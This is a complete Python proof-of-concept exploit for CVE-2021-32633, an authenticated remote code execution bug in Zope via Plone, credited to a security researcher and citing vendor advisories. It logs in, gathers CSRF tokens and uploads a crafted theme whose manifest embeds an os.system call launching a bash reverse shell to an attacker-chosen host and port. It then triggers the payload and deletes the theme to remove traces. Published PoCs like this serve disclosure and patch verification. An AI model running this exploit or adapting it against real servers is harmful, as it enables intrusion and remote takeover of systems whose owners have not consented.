#
# Title: Remote Code Execution via traversal in expressions
# CVE: CVE-2021-32633
# Vulnerability type: Authenticated RCE
# Affected: Zope versions < 5.2, < 4.6
# Software: zopefoundation/Zope (via Plone CMS)
# Research and PoC: cydave of cyllective AG
# References:
#   * https://cyllective.com/blog/post/plone-authenticated-rce-cve-2021-32633/
#   * https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32633
#   * https://github.com/zopefoundation/Zope/security/advisories/GHSA-5pr9-v234-jw36
#   * https://plone.org/security/hotfix/20210518/remote-code-execution-via-traversal-in-expressions
#   * https://plone.org/security/hotfix/20210518
#

import io
import zipfile
import re
import random
import string
import argparse
import urllib.parse
from collections import namedtuple

import requests


ap = argparse.ArgumentParser()
ap.add_argument("-t", "--target", required=True)
ap.add_argument("-u", "--username", required=True)
ap.add_argument("-p", "--password", required=True)
ap.add_argument("-H", "--host", required=True)
ap.add_argument("-P", "--port", required=True, type=int)
args = ap.parse_args()

target = args.target.rstrip("/")
session = requests.Session()


Theme = namedtuple("Theme", ["name", "zipfile"])


def random_string():
    return "".join(random.choices(string.ascii_lowercase, k=12))


def extract_csrf_token(source):
    return re.search('<input.+?name="_authenticator".+?value="(.+?)"', source).group(1)


def auth(username, password):
    login_url = f"{target}/login"
    response = session.get(login_url)
    csrf_token = extract_csrf_token(response.text)
    response = session.post(
        login_url,
        data={
            "__ac_name": username,
            "__ac_password": password,
            "came_from": "",
            "_authenticator": csrf_token,
            "buttons.login": "Log in",
        },
        files={},
    )
    return response.url != login_url


def get_import_theme_csrf_token():
    response = session.get(f"{target}/@@theming-controlpanel")
    csrf_src = response.text.split('<form name="import" method="post" ', 1)[1]
    csrf_src = csrf_src.split("</form>", 1)[0]
    return extract_csrf_token(csrf_src)


def make_theme(payload):
    theme_name = random_string()
    rules_xml = f"""\
<?xml version="1.0" encoding="UTF-8"?>
<rules
    xmlns="http://namespaces.plone.org/diazo"
    xmlns:css="http://namespaces.plone.org/diazo/css"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
</rules>
"""
    manifest_cfg = f"""\
[theme]
title = {theme_name}
description = 

[theme:parameters]
poc = python:nocall("random/_os/system")('{payload}') == None
"""

    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, "w") as zf:
        zf.writestr(f"{theme_name}/rules.xml", rules_xml)
        zf.writestr(f"{theme_name}/manifest.cfg", manifest_cfg)
    zip_buf.seek(0, 0)
    return Theme(theme_name, zip_buf)


def import_theme(theme):
    csrf_token = get_import_theme_csrf_token()
    return session.post(
        f"{target}/@@theming-controlpanel",
        data={
            "enableNewTheme:boolean:default": "",
            "replaceExisting:boolean:default": "",
            "replaceExisting:boolean": "1",
            "form.button.Import": "Import",
            "_authenticator": csrf_token,
        },
        files={"themeArchive": theme.zipfile},
    )


def preview_theme(theme):
    url = f"{target}/++theme++{theme.name}/@@theming-controlpanel-mapper-getframe?path=/&theme=apply"
    return session.get(url, timeout=2)


def get_delete_theme_csrf_token():
    response = session.get(f"{target}/@@theming-controlpanel")
    csrf_src = response.text.split('<form name="delete" method="post" ', 1)[1]
    csrf_src = csrf_src.split("</form>", 1)[0]
    return extract_csrf_token(csrf_src)


def delete_theme(theme):
    csrf_token = get_delete_theme_csrf_token()
    return session.post(
        f"{target}/@@theming-controlpanel",
        data={
            "_authenticator": csrf_token,
            "themes:list": theme.name,
            "form.button.DeleteSelected": "Delete",
        },
    )


auth_ok = auth(args.username, args.password)
if not auth_ok:
    print("[-] Invalid credentials.")
    exit()

payload = f"bash -c \\'bash -i >& /dev/tcp/{args.host}/{args.port} 0>&1\\'"
print(f"[*] Writing payload...")
theme = make_theme(payload)
import_theme(theme)

try:
    print(f"[*] Triggering payload...")
    response = preview_theme(theme)
except (KeyboardInterrupt, requests.exceptions.ReadTimeout):
    pass
finally:
    try:
        delete_theme(theme)
    except Exception:
        pass
